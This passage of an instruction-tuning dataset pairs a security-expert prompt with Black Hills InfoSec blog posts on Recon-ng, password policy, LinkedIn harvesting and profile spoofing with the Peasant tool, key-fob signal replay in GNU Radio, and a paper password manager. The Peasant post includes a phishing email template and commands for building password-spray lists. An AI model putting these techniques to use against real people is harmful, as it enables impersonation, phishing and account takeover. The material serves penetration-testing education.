use sudo apt update sudo apt upgrade sudo apt install -y git python3-pip git clone ithub.com lanmaster53 recon-ng.git cd recon-ng pip3 install -r REQUIREMENTS pip3 install PyPDF3 pyaes bs4 First Launch Once that setup is done start Recon-ng into a new Workspace we'll call example install the modules then add your API keys Installing every marketplace module is simpler than selecting individual modules and installing them each one at a time but you can do it either way The screenshots below show starting up Recon-ng for the first time into a new workspace after completing the installation tasks listed above and completing all of the framework setup tasks so it's ready to use recon-ng -w example marketplace install all keys list keys add name_of_key key_itself Notice that the list of expected key names doesn't populate until you install the modules If you run keys list before installing anything you'll get no output You can still add keys you just have to know the proper name for each one when you do Also notice that if you misspell the name of the key when you add it the framework will accept it as you typed it This is one way in which the framework can better handle new API keys but the side-effect is that if you make a typo when you add a key you'll get no error but the modules that use your new key will fail when you run them You'll get a clear error message then so it's easy to recover from but it's worth knowing that there's no validation of the key names here Basic Usage Next we'll look at the global options add some seed data and get started on our reconnaissance project First look at the global options to see what they are Then we'll change the default timeout to 15 seconds just to see how to set these Options list and options set TIMEOUT 15 The names for all of the options global and per-module are in all caps If you try to set them by lower-case it will fail But Tab-completion works and doesn't care about case If you type options set time the framework auto-completes it to options set TIMEOUT for you Add Seed Data db insert companies db insert domains on one line Make Recon-ng tell you the alternate syntax then use that db insert domains with prompts Load and run a module Running a Module Setting Module Options The 'info command while in a module's context tells you where the module gets its seed or 'source data and tells you how you can modify that Most modules default to reading from the table that's the first word in the module's full name For example the module 'domains-hosts hackertarget will start with something that's already in the 'domains table Module 'info Recon-ng 5.x Cheat Sheet Once you've read the Recon-ng wiki and are comfortable with how it's organized this cheat sheet may be a useful reminder of syntax and workflow ww.blackhillsinfosec.com wp-content uploads 2019 11 recon-ng-5.x-cheat-sheet-Sheet1-1.pdf Where to Go from Here Now that you have seen how to install Recon-ng 5.x how to see what modules are available how to customize their behavior and how to run them you should be ready to start a recon project Keep the cheat sheet close by at first so you don't get stuck on a syntax issue Better yet make a cheat sheet for yourself as you go that only has what you need on it Once you have a workflow that suits your needs creating a workspace adding seed data running modules in some sequence that works for you the next logical step is using resource files to automate it all for you A resource file is a text file with Recon-ng commands in it one per line The framework will run them as if you'd typed them manually The 'script record command allows you to record your actions into one of these resource files and then 'script execute or the '-r argument on the command line when you start the framework will run it for you You can also make the file manually by just typing it directly If you need to keep exact records of your actions while you use Recon-ng the 'spool command will do just that If you need to take a snapshot of the workspace at intervals while you work look into the 'snapshots command After a couple of practice runs this will all become second-nature Once you spend some time making resource files that fit your process Recon-ng will become a wonderful assistant collecting open-source information for you while you work on other things"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Passwords: Our First Line of Defense</title>\n<taxonomies>Blue Team, Blue Team Tools, Informational, Password Cracking, Password Spray, Darin Roberts, password policy, passwords</taxonomies>\n<creation_date>Tue, 03 Dec 2019 17:36:56 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Darin Roberts Why do you recommend a 15-character password policy when name your favorite policy here recommends only 8-character minimum passwords I have had this question posed to me a couple of times in the very recent past There were 2 separate policies that were shown to me when asking these questions First was the NIST policy From the NIST 800-63 guidelines it says that memorized secrets are to be at least 8 characters in length Memorized secrets are defined to include passwords The NIST guidelines were recently updated but the password minimum length remains at 8 characters Taken from log.didierstevens.com 2017 02 28 password-history-analysis The other policy was the policy for Microsoft Office 365 This policy states that one recommendation for keeping your organization as secure as possible is to maintain an 8-character minimum length requirement longer isn't necessarily better This is taken from ocs.microsoft.com en-us office365 admin misc password-policy-recommendations?view o365-worldwide I disagree with both of these policies and STRONGLY disagree with the policy from Microsoft I will explain my reasoning and hopefully will convince those of you with an 8-character password policy to change to something that is stronger When I am working on a pentest one of the first things I do is see if there is a place that I can password spray These portals are often email but sometimes they are custom login portals VPN portals or another login portal that employees use If the password policy is 8-character minimums I will usually get in Given a large enough field of users found through recon there is almost always at least one user who has a password of Fall2019 Summer19 or Company123 It used to be funny when that happened but it happens so often that now it is just sad You might be saying to yourself All of my external portals use two-factor authentication so I am good Well the two-factor authentication 2FA is only as good as its implementation One of my co-workers was able to get into a 2FA protected email account because one of the 2FA methods went to a Skype phone number Sounds secure except the Skype account used only single factor She logged in to Skype as the victim sent the 2FA request to the Skype account and then logged in to email I am in no means saying that we shouldn't use 2FA because it can be bypassed 2FA if employed correctly thwarts many attacks I am only saying that we shouldn't be ignoring the first method of protection passwords If your first authentication method is difficult to bypass many attackers won't even be able to get to the second method of authentication So what should you make your password policy The easy answer is at least 15 characters Why that length We will be having a webcast on this very topic this week and you can register below There will also be a follow-up blog with more explanation Webcast Register for our next webcast Passwords You Are the Weakest Link on Dec 5 2019 1 00 PM EST at ttendee.gotowebinar.com register 4720742581883580684"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Collecting and Crafting User Information from LinkedIn</title>\n<taxonomies>Author, Finding, General InfoSec Tips & Tricks, How-To, Informational, InfoSec 101, Justin Angel, Phishing, Recon, Red Team, Red Team Tools, Justin Angel, LinkedIn, Parsuite, Peasant, SendGrid</taxonomies>\n<creation_date>Wed, 11 Dec 2019 13:00:36 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Justin Angel Penetration testing and red team engagements often require operators to collect user information from various sources that can then be translated into inputs to support social engineering and password attacks LinkedIn is obviously a prime source for this type of information since users can associate themselves with a particular company Assuming we have identified the companies our target organization owns during earlier stages of reconnaissance we may be able to enumerate employee information by simply finding the company page within LinkedIn and browsing the people section However for the following and more reasons or magic this isn't very efficient or straightforward So much copypasta unless you're being smart and using LinkedInt by vysec the key inspiration for this tool LinkedIn restricts the information a given account can access on a target profile based on a constellation of variables such as the industry it's currently affiliated with and if it shares any overlapping connections Depending on the effectiveness of the target company's security awareness training personnel may have their profiles configured to hide personal information before first establishing a connection with your account The remainder of this brief post will discuss my strategy for gaining as much profile content as possible and a quick example of how to quickly manipulate the output from Peasant into actionable values I use the following strategy to maximize the number of accessible profiles associated with a company I configure my profile such that it appears to hold a position with the target company This often opens up a few profiles I can connect with Harvest information from accessible profiles If this yields insufficient information mileage varies I'll duplicate the content from a high-impact profile to my own The goal here is to make your profile appealing to accounts you're about to send connection requests to The greater number of connections your account shares with a company the greater number of profiles it can access Recruiter profiles specializing in the same industry as the target organization is a good choice Blocking the account you just spoofed is a good idea otherwise things might get weird For profiles I can connect with send a connection request Tip It's good to exercise some discretion here Sending a connection request to the security team isn't a great idea probably Wait for one or more requests to be accepted For every couple of connection requests accepted repeat steps 2 and 5 until the desired number of profiles are collected This is a laborious and time-consuming process when performed manually so I developed a utility Peasant to automate many of these steps It provides three basic modes of operation harvest_contacts For each given company identifier harvests contact information from accessible LinkedIn profiles add_contacts Forge connection requests for target user profiles spoof_contact Spoof an accessible LinkedIn profile i.e copy content from the target LinkedIn profile to your own Warning The LinkedIn API is quite complicated and I have not researched the calls at great length only enough to get this code working Depending on the inputs there may be times when Peasant fails particularly when spoofing profiles Try to clear all content of your current profile before spoofing content from the foreign profile if this occurs You should also know that your profile may be flagged for nasty behavior Kudos to the LinkedIn team for taking the time and effort to implement detection mechanisms Restricted Account Alert Contact Harvesting If you've ever visited the People section of a company profile you may have noticed that scrolling to the bottom of the list results in the page dynamically adding additional profiles The web interface is using JavaScript to make API calls and add new HTML elements for each result Peasant capitalizes on these API calls to extract profile content directly from the API Notes LinkedIn often alerts users when their profile has been visited This shouldn't occur when harvesting profiles using Peasant since they're not directly accessed LinkedIn allows access only to 1 000 search results at a time however different results may be returned each time a query is submitted so running Peasant multiple times is recommended Use the '-ac flag to tell Peasant to generate connection requests when a profile is discovered if desired removing the need to run it again this is a bit reckless Warning Unless you have a premium account there's a strict API limit enforced that will not be refreshed until the next month Warning Though the output from LinkedIn is structured well you'll need to browse through and massage the output from Peasant since we're still dealing with user-generated content All content will be dumped without discretion emojis and all Adding Contacts Information gathered when harvesting profiles includes an entity URN field that is used to identify a specific LinkedIn profile We can take this value and craft an API call that will send a connection request to the associated URN Peasant can accept CSV files generated by the harvest_contacts mode and send a connection request to each record The request message can be customized as well Notes You must have enough access to a target profile in order to send a connection request otherwise the request will be ignored LinkedIn enforces a loose API limit on sending connection requests You can usually run it hourly in windows Profile Spoofing Peasant can spoof content from a foreign profile and update your profile with that content including images This is particularly useful in social engineering situations when you'd like to impersonate an entity that works within a target organization Notes You must have enough access with a target profile to view its contents This will likely trigger a view alert on the foreign profile unconfirmed The API calls made to support this are somewhat complex and could introduce imperfections to your profile Take the time to review it for accuracy Should Peasant choke while spoofing a profile clear your current profile of all content and try again Example Let's close out with a quick example focusing on Microsoft's company profile while using a new account with zero connections First I'll export my credentials to an environment variable creds in colon-delimited format username password and run the harvest command aliased to h for short We can see that a health 338 profiles are returned right off Note LinkedIn recently began prompting with captchas and the like You can work around this using the --cookies flag which expects one or more file names containing an array of JSON objects representing name-to-value cookie pairs from an authenticated session like name cookie_name_here value cookie_value_here This should work around the captcha for the moment and I'll likely add a jitter capability in the future Peasant Harvested Information from 338 Profiles Next I'll spoof one of the Microsoft profiles that I can view To protect the innocent I've omitted the profile identifier and elected not to take a screen capture of the results Running the harvest subcommand returns an additional 40 profiles this time Peasant Spoofing Accessible Profile Peasant Harvesting an Additional Forty Profiles Not too bad but we can do better by getting some connection requests sent out to target profiles using the add_contacts subcommand while setting the -if flag to point at our output CSV file At least one person accepted the connection request within a minute of sending these out Harvesting after gaining these connections yielded an additional 662 profiles Peasant Sending Connection Requests from CSV LinkedIn Two Additional Requests Accepted Peasant Harvesting Additional Profiles Two requests were accepted within the hour allowing me to capture profile information from a total of 1 842 accounts Peasant Harvesting Additional Contacts Total 1 842 Working with the Output The CSV output generated by Peasant contains several interesting fields we can use when selecting targets for social engineering and crafting inputs for password attacks Here are the CSV columns for reference first_name last_name occupation public_identifier industry location entity_urn company_name company_id connection_requested Finding Interesting Roles awk is your friend if you want to grep out security roles occupations which may help you avoid starting a fire by sending connection requests to individuals with a heightened level of awareness awk -F print 3 microsoft.csv sort -u grep -vi security Now you can iterate over each of these roles and use grep with the inverse flag to filter them from the CSV file Use the reverse of this technique to identify key roles you may be interested in targeting for social engineering attacks Extracting Occupations Containing the String security Crafting a List of Emails for Password Spray Attacks I'm partial to another silly project of mine called Parsuite and the templatizer module for crafting user lists and the like which accepts and mangles CSV input to return new CSV output containing crafted values Support for random value generation and basic encoding of outputs is available as well We'd use the following command to generate a list of email addresses in first_letter_first_name last_name microsoft.com format If the template structure looks confusing clone a copy of Parsuite and run the help command for the templatizer module to get more information parsuite templatizer -tts first_name 1 lowercase_encode last_name lowercase_encode microsoft.com -csv microsoft.csv Parsuite Command to Craft Email Addresses Parsuite Crafting Email Addresses from Peasant Output Crafting Email Addresses and Content for Phishing Campaigns The templatizer module can accept files containing text templates as well so you could also generate emails containing unique links and identifiers to support a phishing campaign Hello first_name You should unqestionably click this link y.evillanding.com?id RAND Text Email Template parsuite templatizer --csv-file microsoft.csv -tts first_name 1 lowercase_encode last_name lowercase_encode microsoft.com email_template.txt Final Parsuite Command Parsuite Generating Emails with Unique Links Now you can pass this output to any tool that'll accept CSV files as input I've recently used SendGrid as a mail delivery service which is supported by another tool I've thrown together and can run right with this file format Defender Recommendations First and foremost be sure to incorporate content into your security awareness training communicating that threat actors use social media as a phishing message delivery platform and how users should exercise good judgment when interacting with Interplebeians It's becoming increasingly difficult to land phishing emails in target inboxes due to technical controls but getting a direct line of messaging through social media is always going to be easy since our brains are primed to drop a dopamine fog-bomb each time a like or friend request is received Second I recommend creating several LinkedIn accounts and joining them to your Company profile You can then monitor them on occasion to see if they each received invitation requests from the same account in a short period of time an indicator that you're being targeted for reconnaissance Do some due diligence to determine if the activity is malicious and consider reporting the account to LinkedIn I realize this isn't the most practical recommendation but company admins have minimal control over who can join a company profile Bonus Vulnerability Discovery A previously unknown access control flaw was identified in LinkedIn while developing the image spoofing capability of Peasant I initially tried to take the URN identifier of the profile background image configured in a foreign profile and copied it to my evil profile The advantage of this approach is that it eliminated several API calls and dealing with the binary content of pictures The unintended consequence was that deleting the pictures from my profile also deleted the image and URN itself which resulted in the picture no longer being available for the foreign profile thus causing the foreign profile to display the default profile picture I worked directly with LinkedIn's security team to remediate the vulnerability over the Thanksgiving holiday Kudos to them for the prompt response"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>GNU Radio Primer</title>\n<taxonomies>Author, Hardware Hacking, How-To, Informational, Physical, Ray Felch, GNURadio, Hackrf, Raymond Felch, SDR</taxonomies>\n<creation_date>Mon, 09 Dec 2019 15:40:06 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Ray Felch Disclaimer Be sure to use a faraday bag or cage before transmitting any data so you don't accidentally break any laws by illegally transmitting on regulated frequencies Additionally intercepting and decrypting someone else's data is illegal so be careful when researching your traffic Preface Recently I introduced myself to the world of SDR Software Defined Radio and admittedly learned a great deal in the process I discovered that not only could I emulate actual radio-frequency RF hardware components using various software applications such as SDR Sharp GQRX SIGINTOS CubicSDR RTL-SDR supported software etc I could also use GNU Radio flow graphs such as 'grgsm_livemon.grc to capture GSM mobile network packets live in the wild As informative and educational as this project was I wanted to understand GNU Radio flow graphs in greater detail I wanted to know the basics of creating these flow graphs rather than just relying on using preexisting flow graphs without fully understanding why or how it worked Although there is quite a bit of documentation available on the internet GNU Radio and GNURADIO-COMPANION can still be a bit daunting and intimidating when first approached After doing a few Google searches I eventually stumbled upon some online lessons provided by Michael Ossmann of Great Scott Gadgets and I found that this helped me tremendously reatscottgadgets.com sdr Also the GNU Radio Tutorials iki.gnuradio.org index.php Tutorials helped to reinforce what I had just learned In order to familiarize myself with the basics of GNU Radio I chose a project that might be used with regard to replay attacks finding capturing and replaying a raw RF signal to unlock my 1999 Ford Mountaineer bypassing the FOB frequency operated button It needs to be stated upfront that although I was able to capture the unlock signal from my FOB and replay that signal transmitted using the HackRF it did not actually unlock my vehicle The reason for this is because changes were made many years ago to help prevent these replay attacks using a technique known as 'rolling code sometimes referred to as 'hopping code Prior to this change vehicles and garage door openers used fixed codes and were susceptible to being discovered by an attacker with the appropriate receiver This information could be used by the attacker to gain access sometime later At the time of this write-up there have been numerous mentions of a rolling code work-around including using jamming techniques and code reset techniques Regardless I found that working through the project was worth the effort It provided me with a better understanding of GNU Radio and the knowledge required to create my very own working flow graphs Basic GNU Radio and Flow Graph Information All signal processing in GNU Radio is done using flow graphs comprised of individual blocks that perform one digital signal processing operation such as filtering decoding multiplexing etc This data passes between these blocks in various formats complex or real integers floats or basically any kind of data type that you define Every flow graph needs at least one source block input and one sink block output A source or sink might be a USB dongle HackRF BladeRF etc a sound card a file or an fft Fast Fourier transform just to name a few n.wikipedia.org wiki Fast_Fourier_transform Obtaining my FOB specific information In order to determine the operating frequency of my FOB I first searched for the FCC number associated with my vehicle A Google search followed by an FCC search provided the following information The FCC search results provided the frequency I was looking for Armed with the RF frequency of my device 315Mhz it was time to attempt a capture of the 'unlock vehicle signal Normally I could have used one of the many available apps SDR Sharp etc to monitor for and capture the raw data however this time I wanted to create the building blocks myself using the GNU Radio flow graphs I moved into my home projects directory and issued the following command sudo gnuradio-companion Upon loading gnuradio-companion I clicked to create a new flow graph Notice that the new flow graph opens with two blocks already defined as Options and Variable The Options ID top_block defines the tool-chain library that we'll be using QT-GUI WX-GUI none hier block etc and the Variable block ID samp_rate is established to allow us to choose our signal sample-rate defaulted to 32ksps 32 thousand samples per second Note Right-mouse-click on any block to display the properties and to modify its parameters I'll be using the HackRF supported by the osmocom Source block and the recommended minimum sample-rate when using the HackRF is 2M samples per second I can select the osmocom Source by finding it and double-clicking on it in the list At this point I might want to change the sample rate variable from the default 32k 32e3 to 2M 2e6 Any block in the flow graph that specifies the variable 'samp_rate will now use the new edited value It would also be very helpful to have a variable for the desired target RF center frequency of 315Mhz 315e6 This can be accomplished easily by copying and pasting the 'samp_rate variable block and naming the new variable block 'center_freq I can now right-mouse-click on my osmocom Source block and change the default CH0 frequency 100e6 to now be the variable 'center_freq My flowgraph now looks like this Notice that the two variables 'samp_rate and 'center_freq values are now being followed by the osmocom Source block Defined variables come in very handy as flow graphs grow in size and readability becomes obscured Also notice the blue colored output of the osmocom Source The color blue indicates a complex value real and imaginary that will be provided at its output If the output color were orange then the output would be a real value integer float absolute etc This is an important concept to be aware of Input and output colors must match or an error will be thrown Mismatches can be corrected by editing the Output Type or Input Type property of the offending block And lastly notice that osmocom Source ID is displayed in red letters GNU Radio uses red to indicate an error in the flow graph In this case the error is pertaining to the Source block missing its output connection This will be satisfied when I add the output sink block and connect the two blocks together Creating the sink To complete my preliminary flow graph I need to add an FFT Sink so that I can monitor the signal activity and ensure that everything is working as expected This can be accomplished by choosing the QT-GUI Frequency Sink block under Instrumentation I need to enter the properties window and specify the variable 'center_freq as the Center Frequency parameter Also I need to connect the output of osmocom Source to the input of QT-GUI Frequency Sink To execute my flowgraph I click the green Execute button Note To stop execution click the red 'X to the right of the green Execute button This should open an FFT window displaying the 315MHz RF signal being received by the HackRF At this point I can see that the flow graph is sampling a bandwidth of 2MHz with a center frequency of 315MHz So far it appears that the flow graph is working as expected Next I would like to be able to press the 'unlock button on my FOB and display the resultant signal This can be accomplished using the same flow graph but first I need to go into the running FFT window and click the center button on the mouse This opens a drop-down menu where I can select 'Max Hold This feature will display any signal that is higher than the current signal being displayed Executing my flow graph with Max Hold enabled results in the following display when I click the FOB button Capturing the FOB unlock signal for replay In order to capture the resultant FOB generated signal and save it to a file I needed to include another Sink block output to my flow graph This new block can be found under File Operators and is called File Sink Right-mouse-clicking allows me to open the properties window and enter a filename for the captured raw data I chose to name this file 'fob_capture Note These files can get quite large very quickly as we will be sampling 2 million samples per second using floating-point notation For this reason I will execute the flow graph click the FOB button and then stop the flow graph as quickly as possible My modified flowgraph now looks like this Executing the flow graph and capturing the FOB signal results in a 49.3M byte raw file Directory listing -rw-r--r 1 root root 49311744 Nov 10 21 06 fob_capture Replaying the FOB signal from the captured file Note In GNU Radio we can disable blocks from being executed by right-mouse-clicking the block and selecting 'Disable from the drop-down menu This will display the block as grayed out indicating that the block is temporarily removed from the flow graph execution To replay the captured signal we might have normally created an entirely new flow graph however to demonstrate the 'Disable block feature I decided to just disable the osmocom Source QT GUI Frequency Sink and File Sink blocks After being disabled the three blocks are now grayed out Next I created a new source block using the File Source block under File Operators I opened the block properties and entered the name of my previously captured file 'fob_capture I then created a duplicate copy and paste of the previously used QT-GUI Frequency Sink FFT block so that I could watch the signal being replayed The final thing I did was to use an osmocom Sink block to actually transmit the replay signal using the HackRF My modified flowgraph now looks like this The following video taken with my phone shows the results of executing this flow graph Note The 'Repeat parameter in the File Source block indicates that the file will repeat in an endless loop Ideally we would only allow the signal to be played one time in a replay attack but for demonstration purposes I chose to repeat the replay Other useful GNU Radio information If you have had any previous experience using hardware equipment such as oscilloscopes frequency generators frequency counters spectrum analyzers etc it's good to know that this equipment can be added to your flow graphs to further supplement your project development and testing The following demonstrates using an oscilloscope to lock into the actual captured FOB signal at a much lower level showing the actual digital pulses making up the code Although this level of information is not necessarily required for a replay attack it is good to know the options are available Also notice I'm using the WX-GUI library to demonstrate using the scope block rather than the QT-GUI library used earlier Throttle block when and why Also worth mentioning is the Throttle block which can be found under the 'Misc category in the list The Throttle block is typically attached directly to the output of a non-hardware source block Signal Source block etc in order to limit the rate at which that source block creates samples We would use the Throttle block to throttle the flow of samples such that the average rate does not exceed the specified rate samp_rate A throttle block should be used if and only if your flow graph includes no rate limiting block which is typically hardware SDR dongle speaker microphone etc For example a Throttle block could be used in a flow graph that is simulating actual hardware but with the absence of an actual clock In the following example flow graph if we remove the Throttle block the output will look the same but our CPU will be at 100 and GNU Radio might crash This is a good example of when to use a Throttle block It should also be noted that the throttled sampling is not intended to be very accurate in precisely controlling the rate of samples This needs to be controlled by a source or sink tied to sample clock USRP or audio card in which case a Throttle block would not be used Generally speaking a Throttle block is normally not necessary and should be avoided especially when using a hardware source USRP SDR-RTL etc clock This is because a Throttle block is a bad clock and generally leads to a two-clock problem and potentially very bad results can occur The rule-of-thumb is if the flow graph has a radio device USRP SDR-RTL etc OR audio device sound card etc connected DO NOT USE a Throttle block Summary As stated at the top although I was able to capture the unlock signal from my FOB and replay that signal I still consider the effort a win even if I didn't actually unlock the vehicle with the replay Going forward new RF radio frequency related projects will no doubt present itself New vulnerabilities will be exposed Armed with the ability to emulate expensive radio hardware through software flow graphs GNU Radio will always be a valuable tool to have in my arsenal It's a cat and mouse game for sure but thanks to the InfoSec community's constant research and contributions we can continue to share our knowledge and strive to keep our systems secure"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>'Twas the Week Before Hackmas</title>\n<taxonomies>Fun & Games, Informational, dakota nelson, hackmas</taxonomies>\n<creation_date>Wed, 18 Dec 2019 21:03:07 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Dakota Nelson 'Twas the week before HackmasAnd all through their housesNot a tester was workingNor moving their mousesThe findings were listed in reports with careIn hopes that bugfixes would soon be thereThe hackers were nestled all snug in their chairsWhile bitstreams of 0day flowed through twisted pairsAnd Heather on her treadmill desk and John on a plane Had just muted the testers so they could try to stay sane When out on the Twitter there arose such a stormThat even the interns were stirred from their dormsAway to the internet we flew screaming WOWZERS Ate up all the bandwidth with our non-BHIS browsers The moon on the breast of the new-fallen snow Went totally unnoticed by the hackers belowWhen what to my wondering eyes did a path beat But a felony libelslander and eight clueless retweetsWith McAfee's arrival he has altcoins to sell I knew in a moment that this would not go wellMore rapid than Oracle vulns the spectators cameAnd the internet raged and shouted and shamed No disclosure no research no Google vuln dev Yes to export control and online conference reg To the top of the feed to the blogs big and small!Now yell away yell away yell away all!As the arguments heated and no-one knew why I took just a moment to look at the skyAnd up on the housetop the snowflakes they flew Lit by festive lights and the blinky ones too -And then in the blinkenlights I saw just how prettyThe world could be in this little cityAs I blinked once or twice and turned back around I realized my phone wasn't making a sound.It was silent and dark something big was afoot The internet was gone completely kaput!A feed full of tweets flung into the black May never result in not so clever come-backs.My eyes how they twinkled my dimples how merry!As the router's lights blinked just as red as a cherryMy mouth curled upward becoming a smileAs the snow just kept falling all of the whileNot a sysadmin now would leave their cozy home Unless they were out in the snow just to roam The internet was over at least for the nightAnd out with it went our crazed Twitter fightWe were back to being what we were all along A whole bunch of hackers for right or for wrongAs I turned out the lights and went off to bed I felt just for once I had nothing to dreadSoon we would all return to our work But for now there was nowhere for malware to lurkSo laying one finger on a power strip switch My home office was silenced the darkness like pitch.With every bit settled secure for a while I whistled to bed with an ear-to-ear smile.I made sure to exclaim though no-one was in sight -Happy Hackmas to all and to all a good night"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>The Paper Password Manager</title>\n<taxonomies>Author, How-To, Informational, Michael Allen, Password Cracking, Michael Allen, Paper Password Manager, password management, passwords</taxonomies>\n<creation_date>Thu, 02 Jan 2020 14:58:26 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Michael Allen Every year around the holidays I end up having a conversation with at least one friend or family member about the importance of choosing unique passwords for each web site or service they use Usually it's after they've received a phone or a camera or some other smart device for Christmas and have asked me to help them set it up Most recently it was when a friend told me his eBay account got hacked and he asked me how he could keep it from happening again in the future I told him that it was likely the attacker found his password in a data breach of another website and then used the password to login to his account on eBay Then I introduced him to HaveIBeenPwned.com an online service that tracks data breaches so users can find out if their data has been leaked We searched the database for his email address and sure enough his password was stolen in four separate breaches When I asked him if he used the same password on all his accounts he said he did The HaveIBeenPwned Website Where my Friend's Data was Found in Four Different Breaches Suddenly he realized the importance of using a unique password for every different service Sure sites like eBay PayPal and your bank usually have pretty strong security but other sites you use might not be so secure When an attacker steals your password from an insecure website they can easily use it to log in to every other site where you use the same password But how do I keep track of so many passwords Experts often recommend using a password manager to keep track of all the passwords that accumulate as a person creates accounts on different websites A password manager is typically an app either for a smartphone or a computer or a website intended to store all of a user's passwords in a secure way usually in an encrypted database After logging in to the password manager the user can store and retrieve the passwords they use on other websites That way instead of having to remember many different passwords the user only has to remember one password the password that unlocks their password manager Then the password manager does the job of remembering all the other passwords for them Google's Security Blog Listed Using a Password Manager Among the Top 5 Practices Recommended by Security Experts The problem with computer or smartphone-based password managers which I'll refer to as electronic password managers from here onward is that they require a base level of familiarity and expertise to be used every day For regular readers of the BHIS blog using an electronic password manager would likely require little to no effort But for casual technology users who may not be fluent in all of their devices functions electronic password managers are often difficult to learn and too cumbersome to use regularly Just about all of my family members and friends outside of work fall into that second category Older family members especially still ask me to copy and paste files or move pictures from their phone to their computer whenever I come to visit so for them recommending an electronic password manager didn't make sense The Threats Password Managers Face For many people keeping track of unique passwords to their personal accounts writing the passwords down on paper seems like a pretty good solution It solves the problem of having a different password for every account But if the list of passwords is carried outside the home there's a very real possibility it will be lost or stolen Even if the list of passwords never leaves the house it may still be at risk I'm amazed how frequently I hear stories of friends caregivers children and even parents who make fraudulent purchases and even steal money outright from the accounts of people who trust them An ideal solution would also need to keep passwords safe even if it fell into the hands of an untrusted third party After giving it a little thought I came up with what I now call the Paper Password Manager The Paper Password Manager The Paper Password Manager PPM is a simple solution that allows just about anyone to keep track of multiple unique passwords regardless of their proficiency with a computer Granted it's not perfect The user still has to learn the system and like any system it isn't perfectly secure The purpose of the Paper Password Manager is to be a good enough solution so that if one of a user's accounts is compromised all of their other accounts remain secure And if the Paper Password Manager itself is compromised through loss or theft by an attacker who doesn't know the key login credentials to the user's account are not immediately known giving the user time to change their passwords before the attacker gains access to their accounts The table below illustrates the relative strength of the Paper Password Manager compared with other password management strategies The Resilience of Common Password Management Strategies Compared As you can see the Paper Password Manager is more secure than some of the other common low-tech solutions to password management Although it isn't quite as secure as an electronic password manager it is simple enough that basic instructions for its use can be summed up in just a few sentences In short the process can be described as follows The Paper Password Manager is just a handwritten list of the user's accounts and passwords with one exception Instead of writing down the whole password for each account the user writes down only the first half what we'll call the unique bit The second half of the password called the key is the same for every account and is not written down Instead the key is memorized by the user To type the password of any account stored in the Paper Password Manager the user simply types in the account's unique bit followed by the key In other words Account Password Unique Bit Key This gives the Paper Password Manager the following characteristics The user only has to remember one password the key to keep all the passwords in the PPM secure Since the PPM is stored on paper and not on a computer an attacker must have physical access to the PPM to compromise all the accounts it contains An attacker who compromises the complete password to one of the accounts the unique bit the key cannot derive any other complete passwords without gaining access to the PPM If an attacker learns more than one complete password stored in the PPM they may be able to identify the key but they still cannot derive any other passwords without access to the PPM Detailed instructions for making and using the Paper Password Manager are included in the section below Detailed instructions for using the Paper Password Manager Terms used in the instructions To try and keep things clear throughout this article I made up the following terms for things that get referred to often Paper Password Manager PPM The physical paper media on which all of the user's account details are written Key The secret password to the PPM that is memorized by the user The key must not be written down anywhere on the PPM Unique Bit The unique bit is the part of every account password that is written down in the PPM Together the unique bit and the key form the password for a given account Materials To make your own Paper Password Manager you'll need Paper A pen or pencil Depending on where you plan to keep your Paper Password Manager e.g at your desk in your pocket in your wallet etc you might choose a notepad a folded sheet of paper or a set of small index cards Anything with enough space to capture all your login credentials will do Step 1 Choose your key After gathering the materials the first step in creating your Paper Password Manager is to select its key The key is a password that must be memorized not written down anywhere in the PPM You can write it down somewhere else if you like and I'll discuss that more in the section on backing up your PPM When selecting the key I recommend including at least one uppercase letter one lowercase letter and one numeral The key should also be at least 8-12 characters long I don't recommend including any special characters in the key because unfortunately not all websites allow all special characters to be used in passwords Your key will be part of every password you create so if you pick a key that isn't allowed on one website because the site doesn't allow you to use special characters you'll have to make an exception for that site and that can get confusing I do recommend including a special character in the unique bit whenever possible which we'll get to later Similarly the reason I recommend keys 8-12 characters long is because not all websites allow long passwords A longer key is always better just be aware that if you have a longer key you may need to select a shorter unique bit for any websites that don't allow long passwords Here are some keys I made up as examples along with some details of each Don't use 